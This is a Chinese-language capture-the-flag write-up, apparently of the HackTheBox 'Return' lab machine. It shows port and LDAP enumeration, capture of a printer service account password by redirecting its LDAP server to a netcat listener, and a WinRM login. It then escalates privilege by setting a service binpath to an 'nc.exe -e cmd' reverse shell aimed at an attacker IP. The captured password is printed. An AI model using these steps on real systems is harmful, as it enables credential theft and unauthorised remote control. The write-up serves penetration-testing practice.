针对目标服务进行端口扫描

```
sudo nmap -p- --min-rate 10000 10.10.11.108
```

![image-20241024150754714](https://files.seeusercontent.com/2026/04/07/yH7d/image-20241024150754714.png)

针对开放的端口进行进一步服务扫描

```
sudo nmap -p53,80,135,139,445,464,636,3268,3269,5985,9389,49665,49666,49675,49679,49682,49720 -A 10.10.11.108 -oX Return.xml
```

![image-20241024150822791](https://s2.loli.net/2024/10/24/zjS9avOF54hyWZg.png)

优先进行LDAP扫描

```
ldapsearch -x -s base namingcontexts -H ldap://10.10.11.108:389
ldapsearch -x -b "DC=return,DC=local" -H ldap://10.10.11.108:389
```

![image-20241024152503426](https://s2.loli.net/2024/10/24/RZkVPy1GjFcYsAf.png)

![image-20241024152512904](https://s2.loli.net/2024/10/24/vLQ4MSiKTbFpHWZ.png)

根据LDAPsearch和nmap的扫描结果，优先添加hosts记录

```
10.10.11.108  return.local
```

接着我们针对smb端口进行尝试，存在访问相关的问题

```
smbclient -L //10.10.11.108
```

![image-20241024152931716](https://s2.loli.net/2024/10/24/nILuESlwezWO1C2.png)

让我们回到80端口，查看http服务的情况

![image-20241024153441257](https://files.seeusercontent.com/2026/04/06/Rid5/image-20241024153441257.png)

在setting页面获取到两个信息

1.添加新的hosts记录

```
10.10.11.108  printer.return.local
```

2.存在用户为svc-printer

其他页面没有什么返回内容了，尝试对该页面的值进行修改，查看请求

![image-20241024155342581](https://files.seeusercontent.com/2026/04/07/4fYy/image-20241024155342581.png)

发现实际请求中只会附带一个server address参数，其他三个参数不会通过请求修改也就是固定的，那么我们考虑对请求地址进行修改为本地的IP地址，并在本地开启NC进行抓起，尝试是否可以抓取到另外三个值的输入，特别是密码

```
sudo nc -nvlp 389
```

![image-20241024155622421](https://s2.loli.net/2024/10/24/jv92SzGKf4WRgO3.png)

真的接收到了一个请求

最后一行的内容看着应当就是svc-printer的密码

```
user:svc-printer
pass:1edFg43012!!
```

使用netexec针对目前的用户和密码进行可用性验证

```
netexec winrm 10.10.11.108 -u svc-printer -p '1edFg43012!!'
```

![image-20241024160129085](https://s2.loli.net/2024/10/24/w8UNs6PFoGMRDyC.png)

可以进行登录

```
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
```

![image-20241024160237910](https://s2.loli.net/2024/10/24/CxRJTcjMSBLpKOr.png)

在对应的desktop文件夹内获取到对应的flag

下一步准备开始进行提权，首先查看你目标服务器上目前存在的用户情况

```
net user /domain
```

![image-20241024160938338](https://s2.loli.net/2024/10/24/CTtA1fh4BXSaskm.png)

```
net user svc-printer
```

![image-20241024165159488](https://s2.loli.net/2024/10/24/VJc54fg3HBpGK1t.png)

发现有两个特别的组server operators 和print operators，经过Google关键词搜索”Server Operators Group how to get shell“，找到了以下的链接内容https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/

尝试使用连接中方法进行shell反弹

```
services
```

![image-20241024165606657](https://s2.loli.net/2024/10/24/YWntz9PZ8vpsGIo.png)

看到和一个和文章中类似的vmtoolsd.exe服务进程

优先上传nc.exe，根据文章内容进行相应服务配置的修改

```
sc.exe config VMTools binpath="C:\windows\system32\cmd.exe /c C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.16.8 12345"
```

![image-20241024170149855](https://s2.loli.net/2024/10/24/9zESoMV7lhp58uA.png)

进行服务的停止和启动

```
sc.exe stop VMTools
sc.exe start VMTools
```

![image-20241024170310389](https://s2.loli.net/2024/10/24/Y2wqOlUKGgjS7Q4.png)

成功突破边界，获取到对应的flag
